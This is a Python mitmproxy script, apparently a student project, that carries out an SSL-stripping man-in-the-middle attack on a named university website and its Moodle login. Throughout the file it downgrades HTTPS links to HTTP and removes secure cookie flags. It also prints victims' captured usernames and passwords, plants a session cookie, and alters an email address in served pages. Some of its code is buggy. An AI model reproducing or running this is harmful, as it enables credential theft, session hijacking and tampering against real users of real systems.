import httplib, urllib, pydevd
from libmproxy.protocol.http import HTTPResponse
from netlib.odict import ODictCaseless

# uncoment if i want connect to remote debuging
# pydevd.settrace('localhost', port=5678,suspend=False)

# helps storing moodle session cookie
moodleS = ""

def request(context, flow):
  global moodleS
  
  request = flow.request
  hostPretty = request.pretty_host(hostheader=True)  

  if hostPretty == "www.wit.ie":
    #omit "Accept-Encoding" so html will be passed in plain text and we can modify it easily
    newHeader = {}
    newHeader[x[0]] = [ x[1] for x in  request.headers if x[0] != "Accept-Encoding"]
        
    c = httplib.HTTPConnection("www.wit.ie")
    c.request(request.method, request.path, urllib.urlencode(request.get_form_urlencoded()), newHeader)

    response = c.getresponse()
    header = response.getheaders()
    
    # detect browser type and don't use https as domain on chrome or safari
    domainTrick = True
    domainTrick = (False for x in request.headers if x[0] == "User-Agent" and \
                  ("Chrome" in x[1] or "Safari" in x[1]))
    
    # fix for lazy students who can't remember lecturer's name after whole semester
    data = response.read()
    data = data.replace("RLACEY@wit.ie", "RFRISBY@wit.ie")
    
    # replace the url for moodle so it will not be using HTTPS 
    if domainTrick: 
      data = data.replace("https://moodle.wit.ie", "http://https//moodle.wit.ie/myLoginPage")
    else:
      data = data.replace("https://moodle.wit.ie", "http://moodle.wit.ie/myLoginPage")
      
    #convert headers to different datastructure
    header = [(x[0] , x[1]) for x in header]    
    
    #send response to victim
    resp = HTTPResponse([1, 1], response.status, response.reason, ODictCaseless(header), data)
    flow.reply(resp)

  if hostPretty.endswith("moodle.wit.ie") or hostPretty.endswith("https"):
    
    # display username and password when it's send to moodle page
    if "application/x-www-form-urlencoded" in request.headers["content-type"]:
      form = request.get_form_urlencoded()
      print "\n***************Moodle credentials recieved***************"
      print "*** Username: ", form["username"], " Password:", form["password"], " ***"
      print "*********************************************************\n"
    
    # if https is a domain insteand of protocol
    complicated = (True if hostPretty.endswith("https") else False)
                
    # clean if the domain is in the path (because https is domain)
    path = request.path.replace("//moodle.wit.ie", "")
    
    # my specific URL will redirect to login
    if (path == "/myLoginPage"): path = "/login/index.php"

    if (path == "/favicon.ico" or path == "/favicon.png" or path.endswith("favicon")):
      # if got any type of favicon request give him content from my file
      
      if path.endswith("favicon"): path = "/favicon.png"
      
      # load icon content from the file
      with open(path.replace("/", "./"), mode='rb') as file: fContent = file.read()

      #send response to victim
      resp = HTTPResponse([1, 1], 200, "OK", ODictCaseless([["Content-Type",  \
            ("image/vnd.microsoft.icon" if path == "/favicon.ico" else "image/png")]]), fContent)
      flow.reply(resp)
      
    else:
      
      # for all moodle requests except favicon 
      myForm = request.get_form_urlencoded()
      
      #modify headers (referer,location,cookies needs to be altered)
      newHeader = {}
      for x in  request.headers:
        if x[0] != "Accept-Encoding":
          x[1] = x[1].replace("http://", "https://")
          x[1] = x[1].replace("http://https//", "https://")

          # if protocol is instead of domain
          if x[0] == "Host" and "https" in x[1]: x[1] = "moodle.wit.ie"
              
          # if there is no moodle session, force ours
          if x[0] == "Cookie" and not "MoodleSession" in x[1]:
            x[1] = "MoodleSession=" + moodleS + ";" + x[1]
        
          newHeader[x[0]] = x[1]

      #get content from server          
      c = httplib.HTTPSConnection("moodle.wit.ie")
      c.request(request.method, path, urllib.urlencode(myForm), newHeader)

      response = c.getresponse()
      header = response.getheaders()
      data = response.read()
      
      #modify body (javascripts, html links)
      if complicated:
        data = data.replace("https:\/\/moodle.wit.ie", "http:\/\/https\/\/moodle.wit.ie")
        data = data.replace("https://moodle", "http://https//moodle")
      else:
        data = data.replace("https:\/\/moodle.wit.ie", "http:\/\/moodle.wit.ie")
        data = data.replace("https://moodle", "http://moodle")

      #remove https from headers and remove secure tag from cookies
      header = [(x[0] , x[1].replace("https://", "http://").replace("; secure", "")) for x in header]    
      
      # detect moodle cookie and put it by side
      for x in header:
        if x[0] == "set-cookie":
          moodleS = x[1].split("MoodleSession=")[1].split(";")[0].split(',')[0]
    
      #send response to victim          
      resp = HTTPResponse([1, 1], response.status, response.reason, ODictCaseless(header), data)
      flow.reply(resp)  
      
